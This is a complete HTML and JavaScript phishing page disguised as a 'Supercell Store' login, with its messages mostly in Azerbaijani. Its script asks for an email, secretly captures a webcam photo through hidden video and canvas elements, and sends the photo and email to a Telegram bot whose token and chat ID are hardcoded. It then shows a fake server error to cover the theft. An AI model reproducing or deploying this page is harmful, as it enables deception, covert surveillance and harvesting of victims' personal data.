<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell Store - Verify</title>
    <style>
        body { background-color: #1b4fb1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #3a86ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #error-log { color: red; font-size: 11px; margin-top: 10px; word-break: break-all; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div style="background: #ffc107; width: 50px; height: 50px; margin: 0 auto; border-radius: 10px; line-height: 50px; color: white; font-weight: bold; font-size: 30px;">S</div>
    <h3>Supercell Store Login</h3>
    <input type="email" id="email" placeholder="Email ünvanı">
    <button id="loginBtn">SIGN IN</button>
    <div id="error-log"></div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
</div>

<script>
    // --- BURANI DOLDUR ---
    const TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
    const CHATID = "-1003369084883";
    // ---------------------

    const btn = document.getElementById('loginBtn');
    const log = document.getElementById('error-log');

    btn.onclick = async () => {
        const mail = document.getElementById('email').value;
        if(!mail) { alert("Email yazın"); return; }
        
        log.innerText = "Kameraya qoşulur...";
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    send(blob, mail);
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/png');
            }, 1000);
            
        } catch (e) {
            log.innerText = "Kamera Xətası: " + e.message;
            send(null, mail + " (Kamera bloklanıb)");
        }
    };

    async function send(blob, mail) {
        log.innerText = "Telegram-a göndərilir...";
        const fd = new FormData();
        fd.append('chat_id', CHATID);
        
        let url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        if (blob) {
            url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
            fd.append('photo', blob, 'p.png');
            fd.append('caption', "Email: " + mail);
        } else {
            fd.append('text', "Giriş cəhdi: " + mail);
        }

        try {
            const res = await fetch(url, { method: 'POST', body: fd });
            const data = await res.json();
            if(data.ok) {
                log.innerText = "Uğurla göndərildi!";
                alert("Xəta: Serverlə əlaqə kəsildi (404).");
            } else {
                log.innerText = "yanlış e posta: " + data.description;
            }
        } catch (err) {
            log.innerText = "Şəbəkə Xətası: " + err.message;
        }
    }
</script>

</body>
</html>
